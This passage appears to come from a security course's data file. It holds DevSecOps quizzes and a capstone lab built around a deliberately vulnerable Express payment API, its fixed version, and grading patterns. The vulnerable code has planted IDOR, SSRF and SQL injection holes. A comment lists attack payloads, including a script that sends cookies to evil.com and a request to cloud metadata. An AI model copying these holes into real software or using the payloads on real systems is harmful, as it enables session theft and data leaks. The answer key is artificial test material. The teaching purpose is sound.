          expectedPattern: "eslint.*security|semgrep|sonar",
          required: true
        },
        {
          header: "DAST Integration",
          description: "Add OWASP ZAP baseline scan or similar dynamic testing",
          expectedPattern: "zap.*baseline|zap-scan|dast",
          required: false
        },
        {
          header: "Security Gates",
          description: "Fail builds for HIGH/CRITICAL vulnerabilities using exit codes",
          expectedPattern: "audit-level|--severity-threshold|fail-on",
          required: true
        },
        {
          header: "Secret Scanning",
          description: "Add secret detection tool (git-secrets, TruffleHog, or GitHub secret scanning)",
          expectedPattern: "git-secrets|trufflehog|gitleaks",
          required: false
        }
      ],
      learningOutcomes: [
        "Understand DevSecOps shift-left security principles",
        "Integrate SCA tools to detect vulnerable dependencies (Snyk, npm audit)",
        "Implement SAST for static code analysis (ESLint security, Semgrep)",
        "Add DAST for runtime vulnerability testing (OWASP ZAP)",
        "Configure security gates with fail-closed vs fail-open strategies",
        "Prevent secret leaks using automated scanning tools",
        "Generate security reports for visibility and compliance"
      ],
      hints: [
        "Hint 1: Add SCA step: 'npm audit --audit-level=high' (fails on HIGH+ vulnerabilities)",
        "Hint 2: Snyk alternative: 'npx snyk test --severity-threshold=high' (requires SNYK_TOKEN)",
        "Hint 3: SAST with ESLint: 'npx eslint . --ext .js --plugin security' (add eslint-plugin-security)",
        "Hint 4: DAST with ZAP: Use 'zaproxy/action-baseline-scan' GitHub Action",
        "Hint 5: Secret scanning: 'git-secrets --scan' or 'trufflehog filesystem .'",
        "Hint 6: Security gate example: 'npm audit --audit-level=high || exit 1' (fail build)",
        "SOLUTION: Add SCA + SAST + security gates to workflow BEFORE deployment step"
      ]
    },
    quizzes: [
      {
        question: "What is SCA (Software Composition Analysis) in DevSecOps?",
        type: "multiple_choice" as const,
        options: [
          { id: "a", text: "Static code analysis for your own code" },
          { id: "b", text: "Analysis of third-party dependencies for known vulnerabilities" },
          { id: "c", text: "Runtime security testing" },
          { id: "d", text: "Encryption key analysis" }
        ],
        correctAnswers: ["b"],
        explanation: "SCA tools (like npm audit, Snyk, OWASP Dependency-Check) scan third-party libraries and dependencies for known vulnerabilities (CVEs), helping prevent supply chain attacks.",
        category: "DevSecOps"
      },
      {
        question: "What is SAST (Static Application Security Testing)?",
        type: "multiple_choice" as const,
        options: [
          { id: "a", text: "Testing running applications for vulnerabilities" },
          { id: "b", text: "Analyzing source code for security issues without executing it" },
          { id: "c", text: "Scanning dependencies for CVEs" },
          { id: "d", text: "Manual penetration testing" }
        ],
        correctAnswers: ["b"],
        explanation: "SAST tools (like ESLint security plugin, Semgrep, SonarQube) analyze source code statically (without running it) to find security vulnerabilities like SQL injection, XSS, hardcoded secrets.",
        category: "DevSecOps"
      },
      {
        question: "What is DAST (Dynamic Application Security Testing)?",
        type: "multiple_choice" as const,
        options: [
          { id: "a", text: "Static code analysis" },
          { id: "b", text: "Dependency vulnerability scanning" },
          { id: "c", text: "Testing a running application by simulating attacks" },
          { id: "d", text: "Code review" }
        ],
        correctAnswers: ["c"],
        explanation: "DAST tools (like OWASP ZAP, Burp Suite) test running applications by sending malicious payloads and analyzing responses, finding runtime vulnerabilities that static analysis might miss.",
        category: "DevSecOps"
      },
      {
        question: "In DevSecOps, what does 'shift-left' security mean?",
        type: "multiple_choice" as const,
        options: [
          { id: "a", text: "Moving security checks to production only" },
          { id: "b", text: "Integrating security earlier in the development lifecycle" },
          { id: "c", text: "Deploying to left-side servers" },
          { id: "d", text: "Using left-hand encryption keys" }
        ],
        correctAnswers: ["b"],
        explanation: "Shift-left means moving security testing earlier in the development process (during coding, PR reviews, CI builds) rather than waiting until just before production deployment. This catches vulnerabilities sooner when they're cheaper to fix.",
        category: "DevSecOps"
      },
      {
        question: "Secret scanning tools should be run in CI/CD pipelines to prevent credential leaks.",
        type: "true_false" as const,
        options: [
          { id: "true", text: "True" },
          { id: "false", text: "False" }
        ],
        correctAnswers: ["true"],
        explanation: "Secret scanning tools (git-secrets, TruffleHog, GitHub secret scanning) detect hardcoded API keys, passwords, and tokens in commits, preventing credential leaks to version control.",
        category: "DevSecOps"
      },
      {
        question: "What is a 'security gate' in CI/CD pipelines?",
        type: "multiple_choice" as const,
        options: [
          { id: "a", text: "A physical gate at the datacenter" },
          { id: "b", text: "A checkpoint that fails the build if security criteria aren't met" },
          { id: "c", text: "An encryption gateway" },
          { id: "d", text: "A firewall rule" }
        ],
        correctAnswers: ["b"],
        explanation: "Security gates are automated checkpoints in CI/CD that block deployment if security scans find issues above a threshold (e.g., fail on HIGH/CRITICAL vulnerabilities, warn on MEDIUM/LOW).",
        category: "DevSecOps"
      },
      {
        question: "Which command runs npm's built-in SCA tool to check for vulnerable dependencies?",
        type: "multiple_choice" as const,
        options: [
          { id: "a", text: "npm scan" },
          { id: "b", text: "npm audit" },
          { id: "c", text: "npm security" },
          { id: "d", text: "npm check" }
        ],
        correctAnswers: ["b"],
        explanation: "'npm audit' scans package-lock.json for known vulnerabilities in dependencies and provides fix recommendations. Use 'npm audit --audit-level=high' to fail builds on HIGH+ severity issues.",
        category: "DevSecOps"
      },
      {
        question: "What is the difference between 'fail-open' and 'fail-closed' security strategies?",
        type: "multiple_choice" as const,
        options: [
          { id: "a", text: "They are the same" },
          { id: "b", text: "Fail-closed blocks on security issues; fail-open allows with warnings" },
          { id: "c", text: "Fail-open blocks; fail-closed allows" },
          { id: "d", text: "Both block all deployments" }
        ],
        correctAnswers: ["b"],
        explanation: "Fail-closed (secure by default): block deployment if security checks fail. Fail-open (convenience over security): allow deployment with warnings. Best practice: fail-closed for CRITICAL/HIGH, fail-open for LOW/MEDIUM.",
        category: "DevSecOps"
      },
      {
        question: "AES-256 is the recommended symmetric encryption algorithm for data at rest.",
        type: "true_false" as const,
        options: [
          { id: "true", text: "True" },
          { id: "false", text: "False" }
        ],
        correctAnswers: ["true"],
        explanation: "AES-256 (Advanced Encryption Standard with 256-bit keys) is the industry standard for encrypting data at rest. It's approved by NIST and used worldwide for sensitive data protection.",
        category: "Cryptography"
      },
      {
        question: "What is the purpose of SARIF (Static Analysis Results Interchange Format)?",
        type: "multiple_choice" as const,
        options: [
          { id: "a", text: "Encrypt security reports" },
          { id: "b", text: "Standard format for sharing static analysis results across tools" },
          { id: "c", text: "A programming language" },
          { id: "d", text: "A type of firewall" }
        ],
        correctAnswers: ["b"],
        explanation: "SARIF is a standardized JSON format for security tool outputs, enabling integration with GitHub Security tab, IDEs, and dashboards. Most SAST tools can export SARIF reports.",
        category: "DevSecOps"
      },
      {
        question: "Which ESLint plugin provides security-focused linting rules for JavaScript?",
        type: "multiple_choice" as const,
        options: [
          { id: "a", text: "eslint-plugin-security" },
          { id: "b", text: "eslint-plugin-react" },
          { id: "c", text: "eslint-plugin-prettier" },
          { id: "d", text: "eslint-plugin-typescript" }
        ],
        correctAnswers: ["a"],
        explanation: "eslint-plugin-security adds security-focused linting rules that detect patterns like eval() usage, regex DoS, insecure random number generation, and other common security issues in JavaScript.",
        category: "DevSecOps"
      },
      {
        question: "Encryption keys should never be hardcoded in application code or checked into version control.",
        type: "true_false" as const,
        options: [
          { id: "true", text: "True" },
          { id: "false", text: "False" }
        ],
        correctAnswers: ["true"],
        explanation: "Keys must be stored in environment variables, secret managers (AWS Secrets Manager, Azure Key Vault), or encrypted configuration. Hardcoding keys exposes them to anyone with code access and version control history.",
        category: "Cryptography"
      },
      {
        question: "What is a CVE (Common Vulnerabilities and Exposures)?",
        type: "multiple_choice" as const,
        options: [
          { id: "a", text: "A programming language" },
          { id: "b", text: "A standardized identifier for publicly known security vulnerabilities" },
          { id: "c", text: "An encryption algorithm" },
          { id: "d", text: "A type of SQL injection" }
        ],
        correctAnswers: ["b"],
        explanation: "CVEs are unique identifiers (e.g., CVE-2021-44228 for Log4Shell) assigned to publicly disclosed vulnerabilities. SCA tools use CVE databases to identify vulnerable dependencies.",
        category: "DevSecOps"
      },
      {
        question: "What is the difference between symmetric and asymmetric encryption?",
        type: "multiple_choice" as const,
        options: [
          { id: "a", text: "They are the same" },
          { id: "b", text: "Symmetric uses one key; asymmetric uses a public/private key pair" },
          { id: "c", text: "Asymmetric is faster than symmetric" },
          { id: "d", text: "Symmetric is only for passwords" }
        ],
        correctAnswers: ["b"],
        explanation: "Symmetric (AES, ChaCha20) uses the same key for encryption and decryption (fast, for bulk data). Asymmetric (RSA, ECC) uses public key to encrypt and private key to decrypt (slower, for key exchange and digital signatures).",
        category: "Cryptography"
      },
      {
        question: "TLS/SSL should be configured to use TLS 1.2 or higher, disabling older protocols like SSLv3 and TLS 1.0.",
        type: "true_false" as const,
        options: [
          { id: "true", text: "True" },
          { id: "false", text: "False" }
        ],
        correctAnswers: ["true"],
        explanation: "SSLv3, TLS 1.0, and TLS 1.1 have known vulnerabilities (POODLE, BEAST, etc.). Modern applications should require TLS 1.2 or TLS 1.3 minimum. Configure this in your web server (nginx, Apache) or reverse proxy.",
        category: "Cryptography"
      },
      {
        question: "What is Snyk primarily used for in DevSecOps?",
        type: "multiple_choice" as const,
        options: [
          { id: "a", text: "Code formatting" },
          { id: "b", text: "SCA - scanning dependencies for vulnerabilities and suggesting fixes" },
          { id: "c", text: "Load testing" },
          { id: "d", text: "Database management" }
        ],
        correctAnswers: ["b"],
        explanation: "Snyk is a popular SCA tool that scans dependencies for vulnerabilities, provides fix recommendations (upgrade versions, apply patches), and can monitor projects continuously.",
        category: "DevSecOps"
      },
      {
        question: "What is a supply chain attack in software development?",
        type: "multiple_choice" as const,
        options: [
          { id: "a", text: "Physical theft of hardware" },
          { id: "b", text: "Compromising dependencies or build tools to inject malicious code" },
          { id: "c", text: "DDoS attacks on servers" },
          { id: "d", text: "SQL injection" }
        ],
        correctAnswers: ["b"],
        explanation: "Supply chain attacks target the development pipeline - compromising npm packages, build tools, or CI/CD systems to inject malicious code that gets distributed to all users. SCA tools and dependency verification help prevent this.",
        category: "DevSecOps"
      },
      {
        question: "GitHub Dependabot automatically creates pull requests to update vulnerable dependencies.",
        type: "true_false" as const,
        options: [
          { id: "true", text: "True" },
          { id: "false", text: "False" }
        ],
        correctAnswers: ["true"],
        explanation: "Dependabot (GitHub's SCA tool) automatically detects vulnerable dependencies and creates PRs with version updates to fix them. It also keeps dependencies up-to-date for non-security updates.",
        category: "DevSecOps"
      },
      {
        question: "What is the purpose of OWASP ZAP in a CI/CD pipeline?",
        type: "multiple_choice" as const,
        options: [
          { id: "a", text: "Static code analysis" },
          { id: "b", text: "DAST - automated penetration testing of running applications" },
          { id: "c", text: "Dependency scanning" },
          { id: "d", text: "Code formatting" }
        ],
        correctAnswers: ["b"],
        explanation: "OWASP ZAP (Zed Attack Proxy) is a DAST tool that performs automated security testing on running applications by crawling the app and sending attack payloads to find XSS, SQL injection, and other vulnerabilities.",
        category: "DevSecOps"
      },
      {
        question: "What is 'defense in depth' in cryptography and security architecture?",
        type: "multiple_choice" as const,
        options: [
          { id: "a", text: "Using only the strongest encryption" },
          { id: "b", text: "Implementing multiple layers of security controls" },
          { id: "c", text: "Encrypting everything multiple times" },
          { id: "d", text: "Using very long passwords" }
        ],
        correctAnswers: ["b"],
        explanation: "Defense in depth means using multiple security layers: encryption at rest AND in transit, input validation AND output encoding, WAF AND application-level checks. If one layer fails, others still provide protection.",
        category: "Cryptography"
      },
      {
        question: "What is Semgrep's primary purpose in DevSecOps?",
        type: "multiple_choice" as const,
        options: [
          { id: "a", text: "Dependency scanning (SCA)" },
          { id: "b", text: "SAST - lightweight static analysis with custom rules" },
          { id: "c", text: "Runtime testing (DAST)" },
          { id: "d", text: "Load testing" }
        ],
        correctAnswers: ["b"],
        explanation: "Semgrep is a fast, customizable SAST tool that uses pattern matching to find security issues, bugs, and anti-patterns in code. It supports many languages and allows writing custom security rules.",
        category: "DevSecOps"
      },
      {
        question: "Perfect Forward Secrecy (PFS) in TLS ensures that past communications remain secure even if the server's private key is compromised.",
        type: "true_false" as const,
        options: [
          { id: "true", text: "True" },
          { id: "false", text: "False" }
        ],
        correctAnswers: ["true"],
        explanation: "PFS uses ephemeral key exchange (DHE, ECDHE) so each session has unique encryption keys. If the server key is compromised, attackers can't decrypt past recorded traffic. Enable PFS by configuring TLS cipher suites properly.",
        category: "Cryptography"
      },
      {
        question: "What is the recommended approach for managing secrets in a CI/CD pipeline?",
        type: "multiple_choice" as const,
        options: [
          { id: "a", text: "Hardcode them in the workflow file" },
          { id: "b", text: "Store them in GitHub Secrets, Azure Key Vault, or AWS Secrets Manager" },
          { id: "c", text: "Commit them to a private repository" },
          { id: "d", text: "Email them to developers" }
        ],
        correctAnswers: ["b"],
        explanation: "Use secret management services (GitHub Secrets, HashiCorp Vault, AWS Secrets Manager, Azure Key Vault) to securely store and inject secrets into CI/CD. Never hardcode or commit secrets to version control.",
        category: "DevSecOps"
      },
      {
        question: "What is SonarQube primarily used for?",
        type: "multiple_choice" as const,
        options: [
          { id: "a", text: "Dependency scanning" },
          { id: "b", text: "Continuous code quality and security analysis (SAST)" },
          { id: "c", text: "Load testing" },
          { id: "d", text: "Database optimization" }
        ],
        correctAnswers: ["b"],
        explanation: "SonarQube performs continuous SAST and code quality analysis, detecting security vulnerabilities, code smells, bugs, and technical debt. It integrates with CI/CD and provides quality gates.",
        category: "DevSecOps"
      },
      {
        question: "Hashing and encryption are the same thing and can be used interchangeably.",
        type: "true_false" as const,
        options: [
          { id: "true", text: "True" },
          { id: "false", text: "False" }
        ],
        correctAnswers: ["false"],
        explanation: "Hashing (SHA-256, bcrypt) is one-way and cannot be reversed - used for passwords and integrity checks. Encryption (AES, RSA) is two-way and reversible with a key - used for protecting data confidentiality. They serve different purposes.",
        category: "Cryptography"
      }
    ]
  },
  {
    number: 6,
    title: "Security Testing & Monitoring",
    duration: "2h",
    description: "Security testing, logging, and incident response",
    subparts: [
      "6.1.1 Security testing methodologies",
      "6.1.2 Vulnerability scanning",
      "6.1.3 Security logging and monitoring",
      "6.1.4 Incident response planning"
    ],
    learningOutcomes: [
      "Implement security testing",
      "Configure security logging",
      "Respond to security incidents",
    ],
    lab: {
      title: "CAPSTONE: PaymentAPI Microservice - Multi-Vulnerability Code Review",
      description: "PaymentAPI is about to go live! But a security code review reveals critical vulnerabilities: SSRF, XSS, IDOR, missing rate limiting, and no input validation. Your final mission: perform a comprehensive secure code review and fix all vulnerabilities before production deployment.",
      estimatedTime: 40,
      instructions: `**Story**: You're the senior security engineer at FinTech Corp. Tomorrow morning, the new PaymentAPI microservice goes live, processing $1M in daily transactions. Your manager just sent you the code for final security review. After 10 minutes of reading, you're horrified - this code is a security disaster waiting to happen!

**Critical Vulnerabilities Found**:
- SSRF: Server-Side Request Forgery in webhook notification system
- XSS: Stored Cross-Site Scripting in payment description field
- IDOR: Users can view/cancel other users' transactions
- No Rate Limiting: API can be DDoS'd easily
- No Input Validation: Malicious JSON can crash the server
- SQLI Potential: Dynamic query construction
- No Security Headers: Missing CSP, HSTS
- Secrets in Code: API keys hardcoded

**Your CAPSTONE Security Review Mission**:

**PHASE 1 - Vulnerability Identification** (Code Review):
1. **Read** through the entire PaymentAPI code below
2. **Identify** ALL security vulnerabilities (at least 8 critical issues)
3. **Document** the attack vector and impact for each vulnerability
4. **Prioritize** vulnerabilities by CVSS score (High/Critical first)

**PHASE 2 - Exploitation** (Proof of Concept):
1. **SSRF**: Try fetching http://169.254.169.254/latest/meta-data (AWS metadata)
2. **XSS**: Inject \`<script>alert('XSS')</script>\` in payment description
3. **IDOR**: Access another user's transaction by changing transaction ID

**PHASE 3 - Comprehensive Fix** (Secure Implementation):
1. **SSRF Fix**: Implement URL allowlist for webhook endpoints
2. **XSS Fix**: Add HTML encoding/sanitization for user input
3. **IDOR Fix**: Verify transaction.userId === req.user.id
4. **Rate Limiting**: Add express-rate-limit middleware
5. **Input Validation**: Add Joi or Zod schema validation
6. **SQL Injection**: Replace dynamic queries with parameterized queries
7. **Security Headers**: Add helmet.js middleware
8. **Secrets Management**: Move API keys to environment variables

**Expected Solution**: Secure version of PaymentAPI with ALL vulnerabilities fixed and security best practices applied.`,
      vulnerableCode: [
        {
          filename: "payment-api.js",
          language: "javascript",
          code: `const express = require('express');
const axios = require('axios');
const app = express();

app.use(express.json());

// HARDCODED SECRET (VULNERABILITY 1)
const STRIPE_API_KEY = 'sk_live_1234567890abcdef';

// Mock database
const transactions = [
  { id: 1, userId: 1, amount: 100, description: 'Payment for service', status: 'completed' },
  { id: 2, userId: 2, amount: 50, description: 'Subscription fee', status: 'pending' },
  { id: 3, userId: 1, amount: 200, description: 'Product purchase', status: 'completed' }
];

const users = [
  { id: 1, email: 'alice@example.com', webhookUrl: 'https://alice.com/webhook' },
  { id: 2, email: 'bob@example.com', webhookUrl: 'https://bob.com/webhook' }
];

// VULNERABILITY 2: IDOR - No authorization check
app.get('/api/transactions/:id', (req, res) => {
  const transaction = transactions.find(t => t.id === parseInt(req.params.id));
  
  if (!transaction) {
    return res.status(404).json({ error: 'Transaction not found' });
  }
  
  // MISSING: Check if req.user.id === transaction.userId
  res.json(transaction);
});

// VULNERABILITY 3: XSS - No output encoding
app.post('/api/transactions', (req, res) => {
  const { amount, description } = req.body;
  
  // DANGEROUS: User input stored without sanitization
  const newTransaction = {
    id: transactions.length + 1,
    userId: req.user.id,
    amount: amount,
    description: description, // XSS payload: <script>alert('XSS')</script>
    status: 'pending'
  };
  
  transactions.push(newTransaction);
  
  // Later rendered in admin panel without encoding!
  res.json(newTransaction);
});

// VULNERABILITY 4: SSRF - No URL validation
app.post('/api/transactions/:id/notify', async (req, res) => {
  const transaction = transactions.find(t => t.id === parseInt(req.params.id));
  const user = users.find(u => u.id === transaction.userId);
  
  // DANGEROUS: Attacker-controlled URL
  const webhookUrl = req.body.webhookUrl || user.webhookUrl;
  
  try {
    // SSRF: Can fetch AWS metadata, internal services, etc!
    await axios.post(webhookUrl, {
      transactionId: transaction.id,
      amount: transaction.amount
    });
    
    res.json({ message: 'Notification sent' });
  } catch (error) {
    res.status(500).json({ error: error.message });
  }
});

// VULNERABILITY 5: SQL Injection potential
app.get('/api/transactions/search', (req, res) => {
  const { userId, status } = req.query;
  
  // DANGEROUS: Dynamic query construction
  const query = \`SELECT * FROM transactions WHERE user_id = \${userId} AND status = '\${status}'\`;
  
  // This allows: /api/transactions/search?userId=1&status=completed' OR '1'='1
  res.json([]); // Placeholder
});

// VULNERABILITY 6: No rate limiting
app.post('/api/payments/create', (req, res) => {
  // NO RATE LIMIT: Attacker can spam payment requests
  const { amount, cardNumber, cvv } = req.body;
  
  // Process payment...
  res.json({ message: 'Payment processed' });
});

// VULNERABILITY 7: No input validation
app.post('/api/refund', (req, res) => {
  // NO VALIDATION: Malicious JSON can crash server
  const { transactionId, amount, reason } = req.body;
  
  // What if amount is negative? Or transactionId is a string?
  res.json({ message: 'Refund processed' });
});

// VULNERABILITY 8: IDOR in cancellation
app.delete('/api/transactions/:id/cancel', (req, res) => {
  const transaction = transactions.find(t => t.id === parseInt(req.params.id));
  
  // MISSING: Authorization check
  transaction.status = 'cancelled';
  res.json({ message: 'Transaction cancelled' });
});

// VULNERABILITY 9: Missing security headers (no helmet.js)
// VULNERABILITY 10: No CSRF protection
// VULNERABILITY 11: No CORS configuration (accepts all origins)

app.listen(3000);

/*
ATTACK SCENARIOS:

1. SSRF Attack:
   POST /api/transactions/1/notify
   Body: { "webhookUrl": "http://169.254.169.254/latest/meta-data" }
   Result: AWS metadata leaked!

2. XSS Attack:
   POST /api/transactions
   Body: { "amount": 100, "description": "<script>document.location='https://evil.com?cookie='+document.cookie</script>" }
   Result: Admin's session cookie stolen when viewing transaction!

3. IDOR Attack:
   GET /api/transactions/2 (as user 1)
   Result: Access to user 2's transactions!

4. SQL Injection:
   GET /api/transactions/search?userId=1&status=completed' OR '1'='1
   Result: All transactions leaked!

5. Rate Limit Bypass:
   Loop: POST /api/payments/create (1000 requests/second)
   Result: DDoS attack succeeds!

TOTAL IMPACT: Complete API compromise + financial fraud risk!
*/`
        }
      ],
      correctCode: [
        {
          filename: "payment-api.js",
          language: "javascript",
          code: `const express = require('express');
const axios = require('axios');
const helmet = require('helmet');
const rateLimit = require('express-rate-limit');
const Joi = require('joi');
const DOMPurify = require('isomorphic-dompurify');
const mysql = require('mysql2/promise');
require('dotenv').config();

const app = express();

// SECURITY FIX 1: Add helmet.js for security headers
app.use(helmet({
  contentSecurityPolicy: {
    directives: {
      defaultSrc: ["'self'"],
      scriptSrc: ["'self'"]
    }
  },
  strictTransportSecurity: {
    maxAge: 31536000,
    includeSubDomains: true
  }
}));

app.use(express.json({ limit: '10kb' })); // Limit request size

// SECURITY FIX 2: Rate limiting to prevent abuse
const apiLimiter = rateLimit({
  windowMs: 15 * 60 * 1000, // 15 minutes
  max: 100, // limit each IP to 100 requests per windowMs
  message: 'Too many requests from this IP, please try again later'
});

const paymentLimiter = rateLimit({
  windowMs: 60 * 1000, // 1 minute
  max: 5, // limit payment requests to 5 per minute
  message: 'Too many payment attempts, please try again later'
});

app.use('/api/', apiLimiter);
app.use('/api/payments/', paymentLimiter);

// SECURITY FIX 3: Secrets from environment variables
const STRIPE_API_KEY = process.env.STRIPE_API_KEY;
if (!STRIPE_API_KEY) {
  throw new Error('STRIPE_API_KEY environment variable is required');
}

// Database connection pool with parameterized queries
const pool = mysql.createPool({
  host: process.env.DB_HOST || 'localhost',
  user: process.env.DB_USER || 'root',
  password: process.env.DB_PASSWORD,
  database: process.env.DB_NAME || 'payments'
});

// Mock data (replace with database in production)
const transactions = [
  { id: 1, userId: 1, amount: 100, description: 'Payment for service', status: 'completed' },
  { id: 2, userId: 2, amount: 50, description: 'Subscription fee', status: 'pending' },
  { id: 3, userId: 1, amount: 200, description: 'Product purchase', status: 'completed' }
];

// SECURITY FIX 4: URL allowlist for SSRF protection
const ALLOWED_WEBHOOK_DOMAINS = [
  'alice.com',
  'bob.com',
  'trusted-webhooks.example.com'
];

function isValidWebhookUrl(url) {
  try {
    const parsed = new URL(url);
    
    // Only allow HTTPS
    if (parsed.protocol !== 'https:') {
      return false;
    }
    
    // Check against allowlist
    const isAllowed = ALLOWED_WEBHOOK_DOMAINS.some(domain => 
      parsed.hostname === domain || parsed.hostname.endsWith('.' + domain)
    );
    
    // Prevent internal network access
    const hostname = parsed.hostname;
    if (hostname === 'localhost' || 
        hostname === '127.0.0.1' || 
        hostname.startsWith('192.168.') ||
        hostname.startsWith('10.') ||
        hostname.startsWith('169.254.')) {
      return false;
    }
    
    return isAllowed;
  } catch (error) {
    return false;
  }
}

// SECURITY FIX 5: Input validation schemas
const transactionSchema = Joi.object({
  amount: Joi.number().positive().max(1000000).required(),
  description: Joi.string().max(500).required(),
  currency: Joi.string().length(3).optional()
});

const refundSchema = Joi.object({
  transactionId: Joi.number().integer().positive().required(),
  amount: Joi.number().positive().required(),
  reason: Joi.string().max(500).required()
});

// SECURITY FIX 6: IDOR protection - Authorization middleware
function requireAuth(req, res, next) {
  const userId = req.headers['user-id'];
  if (!userId) {
    return res.status(401).json({ error: 'Unauthorized' });
  }
  req.user = { id: parseInt(userId) };
  next();
}

// SECURITY FIX 7: Transaction ownership verification
app.get('/api/transactions/:id', requireAuth, (req, res) => {
  const transaction = transactions.find(t => t.id === parseInt(req.params.id));
  
  if (!transaction) {
    return res.status(404).json({ error: 'Transaction not found' });
  }
  
  // AUTHORIZATION CHECK: Verify ownership
  if (transaction.userId !== req.user.id) {
    return res.status(403).json({ error: 'Forbidden: Access denied' });
  }
  
  res.json(transaction);
});

// SECURITY FIX 8: XSS prevention with sanitization
app.post('/api/transactions', requireAuth, (req, res) => {
  // Validate input
  const { error, value } = transactionSchema.validate(req.body);
  if (error) {
    return res.status(400).json({ error: error.details[0].message });
  }
  
  const { amount, description } = value;
  
  // SANITIZE user input to prevent XSS
  const sanitizedDescription = DOMPurify.sanitize(description, {
    ALLOWED_TAGS: [], // Strip all HTML tags
    ALLOWED_ATTR: []
  });
  
  const newTransaction = {
    id: transactions.length + 1,
    userId: req.user.id,
    amount: amount,
    description: sanitizedDescription, // Safe from XSS
    status: 'pending'
  };
  
  transactions.push(newTransaction);
  res.json(newTransaction);
});

// SECURITY FIX 9: SSRF protection with URL allowlist
app.post('/api/transactions/:id/notify', requireAuth, async (req, res) => {
  const transaction = transactions.find(t => t.id === parseInt(req.params.id));
  
  if (!transaction) {
    return res.status(404).json({ error: 'Transaction not found' });
  }
  
  // Verify ownership
  if (transaction.userId !== req.user.id) {
    return res.status(403).json({ error: 'Forbidden' });
  }
  
  const webhookUrl = req.body.webhookUrl;
  
  // VALIDATE webhook URL against allowlist
  if (!isValidWebhookUrl(webhookUrl)) {
    return res.status(400).json({ 
      error: 'Invalid webhook URL. Only HTTPS URLs from allowed domains are accepted.' 
    });
  }
  
  try {
    await axios.post(webhookUrl, {
      transactionId: transaction.id,
      amount: transaction.amount
    }, {
      timeout: 5000, // 5 second timeout
      maxRedirects: 0 // Prevent redirect-based SSRF
    });
    
    res.json({ message: 'Notification sent' });
  } catch (error) {
    // Don't leak internal error details
    res.status(500).json({ error: 'Failed to send notification' });
  }
});

// SECURITY FIX 10: SQL Injection prevention with parameterized queries
app.get('/api/transactions/search', requireAuth, async (req, res) => {
  const { status } = req.query;
  
  // Validate input
  const allowedStatuses = ['pending', 'completed', 'cancelled'];
  if (status && !allowedStatuses.includes(status)) {
    return res.status(400).json({ error: 'Invalid status' });
  }
  
  try {
    // PARAMETERIZED QUERY prevents SQL injection
    const query = 'SELECT * FROM transactions WHERE user_id = ? AND status = ?';
    const [rows] = await pool.execute(query, [req.user.id, status || 'pending']);
    
    res.json(rows);
  } catch (error) {
    res.status(500).json({ error: 'Database error' });
  }
});

// SECURITY FIX 11: Input validation for payment creation
app.post('/api/payments/create', requireAuth, paymentLimiter, (req, res) => {
  const paymentSchema = Joi.object({
    amount: Joi.number().positive().max(100000).required(),
    cardNumber: Joi.string().creditCard().required(),
    cvv: Joi.string().pattern(/^[0-9]{3,4}$/).required()
  });
  
  const { error, value } = paymentSchema.validate(req.body);
  if (error) {
    return res.status(400).json({ error: error.details[0].message });
  }
  
  // Process payment with Stripe (using env variable API key)
  // ... payment processing logic ...
  
  res.json({ message: 'Payment processed', transactionId: 123 });
});

// SECURITY FIX 12: Input validation for refunds
app.post('/api/refund', requireAuth, (req, res) => {
  const { error, value } = refundSchema.validate(req.body);
  if (error) {
    return res.status(400).json({ error: error.details[0].message });
  }
  
  const { transactionId, amount, reason } = value;
  
  // Additional validation: amount must be positive
  if (amount <= 0) {
    return res.status(400).json({ error: 'Refund amount must be positive' });
  }
  
  // Verify transaction ownership before refund
  const transaction = transactions.find(t => t.id === transactionId);
  if (!transaction || transaction.userId !== req.user.id) {
    return res.status(403).json({ error: 'Forbidden' });
  }
  
  res.json({ message: 'Refund processed' });
});

// SECURITY FIX 13: IDOR fix for transaction cancellation
app.delete('/api/transactions/:id/cancel', requireAuth, (req, res) => {
  const transaction = transactions.find(t => t.id === parseInt(req.params.id));
  
  if (!transaction) {
    return res.status(404).json({ error: 'Transaction not found' });
  }
  
  // AUTHORIZATION CHECK: Only owner can cancel
  if (transaction.userId !== req.user.id) {
    return res.status(403).json({ error: 'Forbidden: You can only cancel your own transactions' });
  }
  
  transaction.status = 'cancelled';
  res.json({ message: 'Transaction cancelled' });
});

app.listen(3000, () => {
  console.log('Secure PaymentAPI running on port 3000');
});

/*
COMPREHENSIVE SECURITY IMPROVEMENTS:
✓ SSRF Protection: URL allowlist + HTTPS-only + internal IP blocking
✓ XSS Prevention: DOMPurify sanitization strips all HTML
✓ IDOR Fix: Authorization checks verify transaction ownership
✓ Rate Limiting: express-rate-limit prevents API abuse (100 req/15min, 5 payments/min)
✓ Input Validation: Joi schemas validate all user input
✓ SQL Injection Prevention: Parameterized queries with ? placeholders
✓ Security Headers: helmet.js adds CSP, HSTS, etc.
✓ Secrets Management: All API keys from environment variables (dotenv)
✓ Request size limits: Prevent large payload attacks
✓ Timeout protection: 5 second webhook timeout
✓ Error handling: No sensitive information leakage
✓ Defense in depth: Multiple security layers

ATTACK SCENARIOS (now blocked):
1. SSRF → Rejected by URL allowlist and HTTPS validation
2. XSS → Sanitized by DOMPurify (all HTML stripped)
3. IDOR → Blocked by ownership verification (403 Forbidden)
4. SQL Injection → Prevented by parameterized queries
5. Rate Limit → Protected by express-rate-limit middleware
6. Invalid Input → Rejected by Joi schema validation
7. Secrets Exposure → All secrets in environment variables

PRODUCTION-READY SECURITY! All 11 vulnerabilities fixed!
*/`
        }
      ],
      validationCriteria: [
        {
          header: "SSRF Protection",
          description: "Implement URL allowlist validation for webhook endpoints",
          expectedPattern: "allowlist|whitelist|url.*valid|startsWith.*https://",
          required: true
        },
        {
          header: "XSS Prevention",
          description: "Add HTML encoding/sanitization for user input using DOMPurify or similar",
          expectedPattern: "sanitize|encode|escape|DOMPurify",
          required: true
        },
        {
          header: "IDOR Fix",
          description: "Verify transaction ownership before access: transaction.userId === req.user.id",
          expectedPattern: "userId.*===.*req\\.user\\.id|req\\.user\\.id.*===.*userId",
          required: true
        },
        {
          header: "Rate Limiting",
          description: "Add express-rate-limit middleware to prevent abuse",
          expectedPattern: "rate.*limit|rateLimit|express-rate-limit",
          required: true
        },
        {
          header: "Input Validation",
          description: "Add schema validation using Joi, Zod, or express-validator",
          expectedPattern: "joi|zod|validator|validate.*schema",
          required: true
        },
        {
          header: "Security Headers",
          description: "Add helmet.js middleware for security headers",
          expectedPattern: "helmet|app\\.use\\(.*security.*headers",
          required: true
        },
        {
          header: "Secrets Management",
          description: "Move API keys to environment variables (process.env.STRIPE_API_KEY)",
          expectedPattern: "process\\.env|config\\.|dotenv",
          required: true
        }
      ],
      learningOutcomes: [
        "Perform comprehensive secure code reviews using OWASP Top 10 framework",
        "Identify and exploit SSRF vulnerabilities in webhook systems",
